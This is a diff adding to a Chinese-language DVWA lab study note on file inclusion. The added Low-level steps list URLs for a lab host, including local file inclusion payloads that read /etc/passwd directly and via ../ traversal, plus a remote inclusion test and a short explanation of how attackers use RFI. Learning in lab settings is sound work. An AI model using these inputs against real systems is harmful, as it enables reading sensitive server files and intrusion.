@@ -747,7 +747,6 @@ generateSessionToken();
 ```
 # File Inclusion（文件包含）
 
-
 >* File Inclusion[檔案包含]:當伺服器開啟allow_url_include選項時，就可通過php的某些特性函數[include()，require()和include_once()，require_once()]利用url去動態包含文件
 
 [File inclusion vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)
@@ -756,13 +755,39 @@ generateSessionToken();
 >* 遠端檔包含漏洞是因為開啟了php配置中的allow_url_fopen選項（選項開啟之後，伺服器允許包含一個遠端的檔）。
 
 ### Low
+***
+步驟一:點選網站上的超連結==?仔細看瀏覽器的變化
+```
+http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file1.php
+http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file2.php
+http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file3.php
+```
+步驟二:測試是否存在File inclusion vulnerability
+```
+LFI 攻擊測試==>
+http://192.168.1.250/DVWA/vulnerabilities/fi/?page=/etc/passwd
+http://192.168.1.250/DVWA/vulnerabilities/fi/?page=../../etc/passwd
+
+RFI 攻擊測試==>
+http://192.168.1.250/DVWA/vulnerabilities/fi/? page=http://www.google.com
+```
+不肖客是如何利用RFI 漏洞?
+>* 不肖客自己先植入惡意程式在國外網站
+>* 在攻擊有RFI 漏洞並用來讀取別台機器上的惡意程式
+
 
 ### Medium
-
+***
+```
+```
 ### High
-
+***
+```
+```
 ### Impossible
-
+***
+```
+```
 # File Upload（文件上傳）
 
 ### Low
